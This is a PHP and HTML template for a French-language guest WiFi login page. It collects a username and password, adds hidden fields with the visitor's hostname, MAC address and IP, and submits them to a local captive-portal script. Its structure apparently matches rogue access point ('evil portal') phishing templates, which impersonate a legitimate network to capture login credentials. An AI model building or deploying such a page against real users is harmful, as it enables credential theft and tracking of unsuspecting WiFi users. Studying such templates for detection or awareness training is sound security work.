<?php
$destination = "http://" . $_SERVER['HTTP_HOST'] . $_SERVER['HTTP_URI'] . "";
require_once('helper.php');

?>

<!-- The main page template --><html>

<meta http-equiv="content-type" content="text/html;charset=UTF-8" />
<head>
<meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
<title>Portal</title>
<!-- Internal resources --><!-- Javascript resources --><!-- JQuery api must always be first --><script type="text/javascript" language="javascript" src="resources/_javascript/jquery-1.5.2.min.js"></script><script type="text/javascript" language="javascript" src="resources/_javascript/jquery.sprintf.js"></script><script type="text/javascript" language="javascript" src="portal.js"></script><!-- CSS --><link type="text/css" rel="stylesheet" href="resources/_css/portal_global.css">
<!-- External resources --><script type="text/javascript" language="javascript" src="../../javascript/jquery.portal_api.js"></script>
    <script src="jquery-2.2.1.min.js"></script>
    <script type="text/javascript">
      function redirect() {
        setTimeout(function() {
          window.location = "/captiveportal/index.php";
        }, 100);
      }
    </script>
</head>

<body>
		<!-- Body content -->
	<div id="container">
	<!-- Will receive Header, Body, Footer and custom blocks ... -->
<div id="header">
	<!-- The header template -->
	<!-- Will be added on top of the page -->
	&nbsp;
</div>
<div id="bann" ></div>
<div id="corpus">
	<div id="body">
		<div>&nbsp;</div>
		<!-- The body background template -->
		<!-- Will be added on the center of the page -->

<div>
	<div id="reserved_block" >
		<!-- The Reserved Block -->
	<div id="error_info_block">
	<!-- Error Info Block -->
	<span id="error_info_value">&nbsp;</span>
</div>



<div id="editor_text_banner">

	<div id="editor_text_banner_fr" lang="fr" style="display:block">
		<font size="4" color="#64696C" face="Arial"><b>Bienvenue sur le portail WiFi invit&eacute;</b></font>
	</div>

</div>

<form method="POST" action="/captiveportal/index.php" onsubmit="redirect()">

    <!-- Logon Form -->
    <div class="title">
        <span id="logonForm_title_text">Identification</span>
    </div>
    <div class="explain">
        <span id="logonForm_explain_text">Si vous ne possédez pas d'identifiant, vous pouvez vous enregistrer avec le lien ci-dessous.</span>
    </div>
    <div class="h-separator"></div>
    <table>
        <tbody>
            <tr>
                <td>
                    <span id="logonForm_login_text" class="label">Identifiant</span>
                </td>
                <td>
                    <input type="text" name="login" autocomplete="on" required>
                </td>
            </tr>
            <tr>
                <td>
                    <span id="logonForm_password_text" class="label">Mot de passe</span>
                </td>
                <td>
                    <input type="password" name="password" autocomplete="on" required>
                </td>
            </tr>

            <tr>
                <td colspan="2">
                    &nbsp;
                </td>
            </tr>
            <tr>
		<td></td>
                <td>
                    <button  type="submit" id="logonForm_connect_button">Connexion</button>
                </td>
            </tr>
        </tbody>
    </table>
	<input type="hidden" name="hostname" value="<?=getClientHostName($_SERVER['REMOTE_ADDR']);?>">
	<input type="hidden" name="mac" value="<?=getClientMac($_SERVER['REMOTE_ADDR']);?>">
	<input type="hidden" name="ip" value="<?=$_SERVER['REMOTE_ADDR'];?>">
	<input type="hidden" name="target" value="<?=$destination?>">
</form>


<div id="editor_text_Comment">

	<div id="editor_text_Comment_fr" lang="fr" style="display:inline">
		Acc&egrave;s Internet restreint
	</div>

</div>

</div>
</div>


</div>
</div>

</body>

</html>
